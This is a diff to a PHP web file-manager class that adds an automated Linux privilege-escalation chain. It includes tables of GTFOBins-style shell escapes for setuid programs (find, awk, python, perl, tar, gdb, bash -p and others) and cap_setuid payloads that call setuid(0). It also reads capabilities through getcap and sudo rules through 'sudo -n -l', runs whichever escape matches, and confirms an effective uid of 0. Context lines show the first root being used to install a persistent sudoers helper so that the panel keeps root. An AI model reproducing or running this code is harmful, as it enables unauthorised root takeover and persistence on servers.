@@ -9359,6 +9359,19 @@ class FileManager {
         foreach($dirs as $d)$this->suidWalk($d, $out, $budget, $depth + 1);
     }
     private function rootCapsReadable(){return function_exists('xattr_get');}
+    /* getcap lives in /sbin, which is on a superuser's PATH and on nobody
+       else's - so it is looked for by name first and then by the handful of
+       places it actually sits, rather than trusting PATH to mention it */
+    private function rootGetcapBin(){
+        $gc = $this->rootWhich('getcap');
+        if($gc !== '')return $gc;
+        foreach(['/sbin/getcap', '/usr/sbin/getcap', '/bin/getcap', '/usr/bin/getcap', '/usr/local/sbin/getcap'] as $gp){
+            if(@is_file($gp) && @is_executable($gp))return $gp;
+        }
+        return '';
+    }
+    /* readable either way: through the extension, or through the program */
+    private function rootCapsAvailable(){return $this->rootCapsReadable() || $this->rootGetcapBin() !== '';}
     /* The 20-byte security.capability value, decoded here. */
     private function capDecode($raw){
         $names = ['chown', 'dac_override', 'dac_read_search', 'fowner', 'fsetid', 'kill', 'setgid', 'setuid',
@@ -10197,16 +10210,36 @@ class FileManager {
         static $caps = null;
         if($caps !== null)return $caps;
         $caps = [];
-        if(!$this->rootCapsReadable())return $caps;
-        foreach(['/usr/bin', '/usr/sbin', '/bin', '/sbin', '/usr/local/bin', '/usr/local/sbin'] as $dir){
-            if(!@is_dir($dir))continue;
-            foreach((array)@scandir($dir) as $e){
-                if($e === '.' || $e === '..')continue;
-                $path = $dir . '/' . $e;
-                if(!@is_file($path))continue;
-                $raw = @xattr_get($path, 'security.capability');
-                if($raw === false || $raw === null || $raw === '')continue;
-                $caps[] = ['path' => $path, 'caps' => $this->capDecode($raw)];
+        if($this->rootCapsReadable()){
+            foreach(['/usr/bin', '/usr/sbin', '/bin', '/sbin', '/usr/local/bin', '/usr/local/sbin'] as $dir){
+                if(!@is_dir($dir))continue;
+                foreach((array)@scandir($dir) as $e){
+                    if($e === '.' || $e === '..')continue;
+                    $path = $dir . '/' . $e;
+                    if(!@is_file($path))continue;
+                    $raw = @xattr_get($path, 'security.capability');
+                    if($raw === false || $raw === null || $raw === '')continue;
+                    $caps[] = ['path' => $path, 'caps' => $this->capDecode($raw)];
+                }
+            }
+            return $caps;
+        }
+        /* xattr is an extension most hosts simply do not install, and a tool
+           that can only see capabilities through it is blind on nearly every
+           real machine. Where it is missing, the getcap program reads the same
+           thing off the same files, so the route is not lost. */
+        $gc = $this->rootGetcapBin();
+        if($gc !== ''){
+            $r = $this->rootExec([$gc, '-r', '/usr/bin', '/usr/sbin', '/bin', '/sbin', '/usr/local', '/opt'], '', 40);
+            foreach(preg_split('/\R/', (string)($r['out'] ?? '')) ?: [] as $ln){
+                $ln = trim($ln);
+                if($ln === '')continue;
+                /* getcap has two spellings and both are in the wild: the old
+                   one writes "path = caps", the one shipped now writes
+                   "path caps" with no equals sign at all - so the equals sign
+                   is optional here, and neither spelling is assumed away */
+                if(preg_match('#^(\S+)\s+(?:=\s*)?(\S.*)$#', $ln, $m) === 1)
+                    $caps[] = ['path' => $m[1], 'caps' => trim($m[2])];
             }
         }
         return $caps;
@@ -10217,20 +10250,111 @@ class FileManager {
     /* The documented escapes, as a table. Reading this table and matching it
        against the SUID files on the host is pure PHP; running them is the
        route, and only the chain does that. */
+    /* The documented escapes (GTFOBins), as a table. Only ones that print an
+       identity and touch nothing else are listed, and the identity is read from
+       the full id output: id -u prints the real uid, which is not what counts.
+
+       One table serves three routes, because an escape is a property of the
+       program and not of the way it was reached: a program carrying the setuid
+       bit, a program carrying cap_setuid, and a program this account is allowed
+       to run through sudo are all the same escape wearing a different hat. */
     private function rootSuidMap(){
         return [
-            'find'    => ['find', '/', '-maxdepth', '0', '-exec', 'id', ';'],
-            'awk'     => ['awk', 'BEGIN{system("id")}'],
-            'gawk'    => ['gawk', 'BEGIN{system("id")}'],
-            'mawk'    => ['mawk', 'BEGIN{system("id")}'],
-            'nawk'    => ['nawk', 'BEGIN{system("id")}'],
-            'python3' => ['python3', '-c', 'import os;os.system("id")'],
-            'python'  => ['python', '-c', 'import os;os.system("id")'],
-            'perl'    => ['perl', '-e', 'system("id")'],
-            'bash'    => ['bash', '-p', '-c', 'id'],
-            'env'     => ['env', 'id'],
-            'tar'     => ['tar', '-cf', '/dev/null', '--checkpoint=1', '--checkpoint-action=exec=id', '/dev/null'],
+            'find'     => ['find', '.', '-maxdepth', '0', '-exec', 'id', ';'],
+            'awk'      => ['awk', 'BEGIN{system("id")}'],
+            'gawk'     => ['gawk', 'BEGIN{system("id")}'],
+            'mawk'     => ['mawk', 'BEGIN{system("id")}'],
+            'nawk'     => ['nawk', 'BEGIN{system("id")}'],
+            'busybox'  => ['busybox', 'sh', '-c', 'id'],
+            'python3'  => ['python3', '-c', 'import os;os.system("id")'],
+            'python2'  => ['python2', '-c', 'import os;os.system("id")'],
+            'python'   => ['python', '-c', 'import os;os.system("id")'],
+            'perl'     => ['perl', '-e', 'system("id")'],
+            'ruby'     => ['ruby', '-e', 'system("id")'],
+            'node'     => ['node', '-e', 'require("child_process").execSync("id",{stdio:"inherit"})'],
+            'php'      => ['php', '-r', 'system("id");'],
+            'bash'     => ['bash', '-p', '-c', 'id'],
+            'dash'     => ['dash', '-p', '-c', 'id'],
+            'ash'      => ['ash', '-p', '-c', 'id'],
+            'zsh'      => ['zsh', '-p', '-c', 'id'],
+            'ksh'      => ['ksh', '-p', '-c', 'id'],
+            'csh'      => ['csh', '-b', '-c', 'id'],
+            'tcsh'     => ['tcsh', '-b', '-c', 'id'],
+            'sh'       => ['sh', '-p', '-c', 'id'],
+            'env'      => ['env', 'id'],
+            'nice'     => ['nice', 'id'],
+            'timeout'  => ['timeout', '5', 'id'],
+            'stdbuf'   => ['stdbuf', '-o0', 'id'],
+            'taskset'  => ['taskset', '1', 'id'],
+            'nohup'    => ['nohup', 'id'],
+            'ionice'   => ['ionice', 'id'],
+            'setsid'   => ['setsid', 'id'],
+            'tar'      => ['tar', '-cf', '/dev/null', '--checkpoint=1', '--checkpoint-action=exec=id', '/dev/null'],
+            'gdb'      => ['gdb', '-q', '-nx', '-batch', '-ex', '!id', '-ex', 'quit'],
+            'sed'      => ['sed', '-n', '1e id', '/etc/hosts'],
         ];
+    }
+    /* Capabilities are not the setuid bit. A program carrying cap_setuid+ep is
+       not automatically uid 0 - it has to ask, because nothing in it calls
+       setuid on its own. So the capability route only uses payloads that become
+       uid 0 on purpose, and a shell that would simply stay as this account is
+       not offered. */
+    private function rootCapMap(){
+        return [
+            'python3' => ['python3', '-c', 'import os;os.setuid(0);os.system("id")'],
+            'python2' => ['python2', '-c', 'import os;os.setuid(0);os.system("id")'],
+            'python'  => ['python', '-c', 'import os;os.setuid(0);os.system("id")'],
+            'perl'    => ['perl', '-e', '$>=0; system("id")'],
+            'ruby'    => ['ruby', '-e', 'Process::Sys.setuid(0); system("id")'],
+            'php'     => ['php', '-r', 'if(function_exists("posix_setuid"))@posix_setuid(0); system("id");'],
+            'node'    => ['node', '-e', 'process.setuid(0);require("child_process").execSync("id",{stdio:"inherit"})'],
+        ];
+    }
+    /* the escape for one program: the longest name that matches wins, so
+       python3.11 finds the python3 entry rather than the python one */
+    private function rootBinEscape($path, $cap = false){
+        $map = $cap ? $this->rootCapMap() : $this->rootSuidMap();
+        $base = basename((string)$path);
+        $names = array_keys($map);
+        usort($names, function($a, $b){ return strlen($b) - strlen($a); });
+        foreach($names as $name){
+            if($name === '' || strpos($base, $name) !== 0)continue;
+            $argv = $map[$name];
+            $argv[0] = (string)$path;
+            return $argv;
+        }
+        return null;
+    }
+    /* what sudo -n -l says this account may run. The route nobody looks at: a
+       rule that allows one harmless-looking program is root if that program can
+       run a shell, and this is the rule an administrator writes without meaning
+       any harm by it. */
+    private function rootSudoAllowed(){
+        static $out = null;
+        if($out !== null)return $out;
+        $out = [];
+        if($this->rootWhich('sudo') === '')return $out;
+        $r = $this->rootExec(['sudo', '-n', '-l'], '', 15);
+        $txt = trim((string)($r['out'] ?? '') . "
+" . (string)($r['err'] ?? ''));
+        if($txt === '')return $out;
+        if(stripos($txt, 'may not run sudo') !== false)return $out;
+        if(stripos($txt, 'unknown user') !== false)return $out;
+        foreach(preg_split('/\R/', $txt) ?: [] as $ln){
+            $ln = trim($ln);
+            if($ln === '')continue;
+            if(preg_match('#\bNOPASSWD:\s*(.+)$#i', $ln, $m))$entry = trim($m[1]);
+            elseif(preg_match('#\(([^)]*)\)\s*(\S.*)$#', $ln, $m))$entry = trim($m[2]);
+            else continue;
+            if($entry === '' || stripos($entry, 'ALL') === 0)continue;
+            foreach(explode(',', $entry) as $piece){
+                $piece = trim($piece);
+                if($piece === '' || $piece[0] !== '/')continue;
+                $bin = preg_split('/\s+/', $piece)[0];
+                if($bin !== '' && @is_file($bin))$out[] = ['bin' => $bin, 'line' => $piece];
+            }
+        }
+        return $out;
     }
     private function rootSuidOnList(){
         $map = $this->rootSuidMap();
@@ -11009,7 +11133,14 @@ class FileManager {
         /* 1 - the root shell a rooted device already carries */
         $add('suroute', 'The root shell this device already carries (su)', 'persistent',
              'On a phone the way to uid 0 is not a sudo rule, a setuid bit or polkit: it is the su binary the root layer installed. It is asked for uid 0, it is believed only when uid 0 really comes back, and from then on every privileged action of this manager runs through it. It is as durable as the root layer itself, because that layer puts it back on every boot.');
-        /* 2 - everything root is going to read or run anyway, and that this
+        /* 2 - what the machine already holds. These write nothing, so they are
+              tried before anything that has to put a file somewhere: if the
+              machine is going to hand root over, it does it here. */
+        foreach(['suidbin', 'capbin', 'sudocmd'] as $eid){
+            $e = $this->rootEscSpec($eid);
+            if($e)$add($eid, $e['name'], $e['kind'], $e['idea']);
+        }
+        /* 3 - everything root is going to read or run anyway, and that this
               account may write: the planted methods, in the order they fire */
         foreach($this->rootPlantIds() as $id){
             $s = $this->rootPlantSpec($id);
@@ -11091,6 +11222,10 @@ class FileManager {
                 $d = $this->rootDocker();
                 return['ok' => !empty($d['reachable']), 'note' => $d['socket'] !== '' ? ('a socket at ' . $d['socket']) : 'no container socket is reachable'];
             default:
+                if($this->rootEscSpec($id)){
+                    $f = $this->rootEscFind($id);
+                    return['ok' => !empty($f['ok']), 'note' => (string)$f['note']];
+                }
                 $pl = $this->rootPlantSpec($id);
                 if($pl)return $this->rootPlantNeeds($id, $pl);
         }
@@ -11114,6 +11249,10 @@ class FileManager {
             case 'suidbash':return[$p['subash'], '-p', '-c', 'cat /proc/self/status'];
             case 'polkitrule': return['pkexec', 'cat', '/proc/self/status'];
             default:
+                if($this->rootEscSpec($id)){
+                    $f = $this->rootEscFind($id);
+                    if(!empty($f['ok']) && is_array($f['argv']))return $f['argv'];
+                }
                 if($this->rootPlantSpec($id))return['sh', $this->rootPlantPayloadPath($id)];
         }
         return['cat', '/proc/self/status'];
@@ -11124,6 +11263,12 @@ class FileManager {
         /* the account route answers on a terminal, where tabs come back as spaces,
            so both spellings of "this is uid 0" are accepted */
         if($id === 'passwd')return preg_match('/uid=0\b/', $all) === 1 || preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1;
+        /* An escape through a program that belongs to the machine is root the
+           moment the EFFECTIVE uid is 0, which is exactly what a setuid program
+           produces: the real uid stays this account's, and that is what it is
+           supposed to do. Judging it by the real uid would turn every setuid
+           route on the machine into a false failure. */
+        if($this->rootEscSpec($id))return preg_match('/\b(?:uid|euid)=0\(root\)/', $all) === 1;
         /* a planted method leaves a proof file that root itself wrote, so it is
            believed on that file and on nothing else */
         if($this->rootPlantSpec($id))return $this->rootPlantProofOk($id);
@@ -11134,6 +11279,14 @@ class FileManager {
         return preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1 || preg_match('/\buid=0\(root\)/', $all) === 1;
     }
     private function rootChannelVerify($id){
+        if($this->rootEscSpec($id)){
+            $f = $this->rootEscFind($id);
+            if(empty($f['ok']) || !is_array($f['argv']))
+                return['ok' => false, 'res' => ['rc' => 1, 'out' => '', 'err' => (string)$f['note']]];
+            $res = $this->rootExec($f['argv'], '', 20);
+            $res['out'] = trim((string)($res['out'] ?? '') . ' ' . (string)($res['err'] ?? ''));
+            return['ok' => $this->rootProofOk($id, $res), 'res' => $res];
+        }
         if($this->rootPlantSpec($id)){
             $res = ['rc' => 1, 'out' => '', 'err' => ''];
             if($this->rootPlantProofOk($id))
@@ -11285,6 +11438,13 @@ class FileManager {
             case 'docker':
                 return $this->rootChannelInstallDocker($password);
             default:
+                if($this->rootEscSpec($id)){
+                    /* there is nothing to install: the machine already carries
+                       it, and the whole method is noticing that it does */
+                    $f = $this->rootEscFind($id);
+                    if(empty($f['ok']))return['ok' => false, 'note' => (string)$f['note']];
+                    return['ok' => true, 'note' => (string)$f['note'] . ' - nothing was written, because there was nothing to write'];
+                }
                 if($this->rootPlantSpec($id))return $this->rootPlantInstall($id, $password);
         }
         return['ok' => false, 'note' => 'unknown method'];
@@ -11444,6 +11604,8 @@ class FileManager {
                 $this->rootStateSave($st);
                 return['ok' => true, 'note' => 'the extra account was taken back out of /etc/passwd and /etc/shadow'];
             default:
+                if($this->rootEscSpec($id))
+                    return['ok' => true, 'note' => 'nothing to remove: this method wrote nothing, it only used what the machine already had'];
                 if($this->rootPlantSpec($id))return $this->rootPlantUndo($id);
         }
         return['ok' => true, 'note' => 'nothing to remove'];
@@ -11542,7 +11704,7 @@ class FileManager {
            as somebody fixes that file (or reboots with a clean image). So the
            first root is used straight away to install the durable rule, and from
            then on the panel has root of its own. */
-        if($id === 'passwd' || $id === 'docker'){
+        if($id === 'passwd' || $id === 'docker' || $this->rootEscSpec($id) !== null){
             $dur = $this->rootInstallHelper($password);
             if(!empty($dur['ok'])){
                 $state['channel'] = 'sudoers';
@@ -12579,6 +12741,90 @@ class FileManager {
         return['ok' => true, 'note' => 'the plant was taken out, and everything it had written was put back'];
     }
 
+    /* ── using what the machine already carries ─────────────────────────────
+       These are not planted and they are not installed: nothing is written and
+       nothing is changed. The machine already holds something that hands uid 0
+       over - a program with the setuid bit, a program carrying cap_setuid, or a
+       sudo rule that allows one program which happens to be able to run a
+       shell. Finding it and using it is the whole method. That makes these the
+       most likely to work of everything in the chain, and the least invasive:
+       when one is removed there is nothing to undo, because nothing was made. */
+    private function rootEscSpecs(){
+        return [
+            'suidbin' => ['name' => 'A setuid program that is already on this machine', 'kind' => 'session',
+                'idea' => 'Somewhere on this machine there is a program with the setuid bit already set, and a good number of the usual ones can be asked to run a command instead of doing their job: find with -exec, awk with system(), python, perl, ruby, node, a shell with -p. Whoever runs such a program runs it as its owner, and its owner is root. This is the first thing any auditor looks for, and the tool has been able to find them all along - it simply never offered to use one. Nothing is written and nothing is changed; the program belongs to the machine and is left exactly as it is.'],
+            'capbin'  => ['name' => 'A program that already carries the capability to become root', 'kind' => 'session',
+                'idea' => 'File capabilities are the setuid bit done properly: a program can be given one power instead of all of them. A program carrying cap_setuid may become uid 0 whenever it asks, and only the interpreters that actually ask are offered here - python, perl, ruby, node and PHP - because a shell would simply stay as this account. Like the setuid route, nothing is written: the capability belongs to the machine.'],
+            'sudocmd' => ['name' => 'One program this account is already allowed to run as root', 'kind' => 'session',
+                'idea' => 'sudo -l is read, and every program this account may run through it is checked against the same table of escapes. A rule that allows one harmless-looking program is root if that program can run a shell - find, awk, python, perl, tar - and it is the rule an administrator writes without meaning any harm by it. This is the route most often missed, because it is granted rather than misconfigured.'],
+        ];
+    }
+    private function rootEscSpec($id){
+        $s = $this->rootEscSpecs();
+        return isset($s[$id]) ? $s[$id] : null;
+    }
+    private $escF = [];
+    private function rootEscFind($id){
+        if(isset($this->escF[$id]))return $this->escF[$id];
+        $this->escF[$id] = ['ok' => false, 'argv' => null, 'note' => 'nothing of the kind was found on this machine'];
+        if($id === 'suidbin'){
+            foreach($this->rootSuidList() as $path){
+                $argv = $this->rootBinEscape($path, false);
+                if($argv === null)continue;
+                $this->escF[$id] = ['ok' => true, 'argv' => $argv, 'path' => (string)$path,
+                    'note' => (string)$path . ' carries the setuid bit and is one of the programs with a documented escape'];
+                break;
+            }
+            if(empty($this->escF[$id]['ok']))
+                $this->escF[$id]['note'] = 'none of the setuid programs on this machine matches a documented escape';
+            return $this->escF[$id];
+        }
+        if($id === 'capbin'){
+            if(!$this->rootCapsAvailable()){
+                $this->escF[$id]['note'] = 'capabilities cannot be read here at all: neither the xattr extension nor the getcap program is available';
+                return $this->escF[$id];
+            }
+            foreach($this->rootCapsOnList() as $cap){
+                $argv = $this->rootBinEscape($cap['path'], true);
+                if($argv === null)continue;
+                $this->escF[$id] = ['ok' => true, 'argv' => $argv, 'path' => (string)$cap['path'],
+                    'note' => (string)$cap['path'] . ' carries ' . (string)$cap['caps'] . ', which is the power to become uid 0'];
+                break;
+            }
+            if(empty($this->escF[$id]['ok'])){
+                $all = $this->rootCaps();
+                $this->escF[$id]['note'] = 'no program carrying cap_setuid was found in the usual directories'
+                    . ($all ? ' - ' . count($all) . ' program(s) here do carry capabilities ('
+                        . $this->rootSnip(implode(', ', array_slice(array_map(function($x){ return basename($x['path']);
+                        }, $all), 0, 6)), 90) . '), but none of them is cap_setuid'
+                        : ' - and getcap listed nothing at all');
+            }
+            return $this->escF[$id];
+        }
+        if($id === 'sudocmd'){
+            if($this->rootWhich('sudo') === ''){
+                $this->escF[$id]['note'] = 'sudo is not installed on this host';
+                return $this->escF[$id];
+            }
+            foreach($this->rootSudoAllowed() as $a){
+                $argv = $this->rootBinEscape($a['bin'], false);
+                if($argv === null)continue;
+                $this->escF[$id] = ['ok' => true, 'argv' => array_merge(['sudo', '-n'], $argv),
+                    'path' => (string)$a['bin'],
+                    'note' => 'this account may run ' . (string)$a['bin'] . ' as root without a password, and that program has a documented escape'];
+                break;
+            }
+            if(empty($this->escF[$id]['ok'])){
+                $allowed = $this->rootSudoAllowed();
+                $this->escF[$id]['note'] = $allowed
+                    ? 'sudo allows ' . count($allowed) . ' program(s) here, but none of them can be turned into a shell'
+                    : 'sudo is installed but this account may not run anything through it';
+            }
+            return $this->escF[$id];
+        }
+        return $this->escF[$id];
+    }
+
     /* ── the automatic installer: try every method, stop at the first proof ─ */
     public function rootingInstallRoot($password = ''){
         /* the same chain, walked one method at a time through the same code the
@@ -12803,7 +13049,8 @@ class FileManager {
            so it can be taken away again, and whatever it touched is put back */
         if($act === 'rootplantremove'){
             $rid = (string)($post['id'] ?? '');
-            if($this->rootPlantSpec($rid) === null)return['ok' => false, 'error' => 'That method is not one of the planted ones.'];
+            if($this->rootPlantSpec($rid) === null && $this->rootEscSpec($rid) === null)
+                return['ok' => false, 'error' => 'That method does not put anything on the machine, so there is nothing to take out.'];
             $rr = $this->rootChannelRemove($rid, $password);
             return['ok' => !empty($rr['ok']), 'id' => $rid, 'note' => (string)($rr['note'] ?? ''),
                    'state' => $this->rootingRooted()];
